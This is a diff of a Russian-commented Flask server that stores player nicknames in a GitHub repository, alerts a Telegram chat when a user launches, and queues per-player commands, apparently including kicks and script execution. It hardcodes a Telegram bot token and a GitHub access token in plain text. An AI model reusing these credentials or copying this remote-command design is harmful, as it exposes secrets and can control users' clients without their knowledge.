@@ -1,22 +1,67 @@
 from flask import Flask, request, jsonify
 import requests
-import json # Обязательно!
-
-commands_queue = {}
-awaiting_reason = {} # Память бота
+import json
+import base64 # Обязательно добавляем для работы с GitHub
 
 app = Flask(__name__)
 
-# Твои данные
+# Твои данные Телеграма
 TELEGRAM_TOKEN = '8693862606:AAEvhj2EJeSxHhaw0JopIb_oK-COEZKix1g'
 TELEGRAM_CHAT_ID = '8426928414'
 
-# Очередь команд
-commands_queue = {}
-# Память для ожидания причины кика
+# --- НАСТРОЙКИ GITHUB DB ---
+# ВАЖНО: Вставь сюда свой НОВЫЙ токен!
+GITHUB_TOKEN = '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a'
+REPO_OWNER = 'repositorykreml1n'
+REPO_NAME = 'commands'
+FILE_PATH = 'players.json'
+
+def load_players_from_github():
+    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{FILE_PATH}"
+    headers = {"Authorization": f"token {GITHUB_TOKEN}", "Accept": "application/vnd.github.v3+json"}
+    
+    response = requests.get(url, headers=headers)
+    if response.status_code == 200:
+        try:
+            content_b64 = response.json()['content']
+            content_str = base64.b64decode(content_b64).decode('utf-8')
+            saved_players = json.loads(content_str)
+            # Восстанавливаем словарь
+            return {player: [] for player in saved_players}
+        except Exception as e:
+            print("Ошибка чтения базы:", e)
+            return {}
+    return {}
+
+def save_players_to_github():
+    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{FILE_PATH}"
+    headers = {"Authorization": f"token {GITHUB_TOKEN}", "Accept": "application/vnd.github.v3+json"}
+    
+    # 1. Получаем SHA текущего файла, чтобы GitHub разрешил перезапись
+    sha = None
+    response = requests.get(url, headers=headers)
+    if response.status_code == 200:
+        sha = response.json()['sha']
+        
+    # 2. Берем только список ников
+    players_list = list(commands_queue.keys())
+    content_str = json.dumps(players_list, indent=4)
+    content_b64 = base64.b64encode(content_str.encode('utf-8')).decode('utf-8')
+    
+    # 3. Делаем коммит
+    data = {
+        "message": "Авто-сохранение базы TumbaHub",
+        "content": content_b64
+    }
+    if sha:
+        data["sha"] = sha
+        
+    requests.put(url, headers=headers, json=data)
+
+# Загружаем базу при старте сервера!
+commands_queue = load_players_from_github()
 awaiting_reason = {}
-# Память для ожидания скрипта (НОВОЕ)
-awaiting_execute = {} 
+awaiting_execute = {}
 
 @app.route('/')
 def home():
@@ -31,8 +76,11 @@ def log_user():
     username = data.get('username', 'Unknown')
     user_id = data.get('userId', 'Unknown')
     
+    # Если это новый игрок
     if username not in commands_queue:
         commands_queue[username] = []
+        # Сохраняем в GitHub!
+        save_players_to_github()
 
     msg = f"🟢 [V2] НОВЫЙ ЗАПУСК!\n👤 Ник: {username}\n🆔 ID: {user_id}"
     
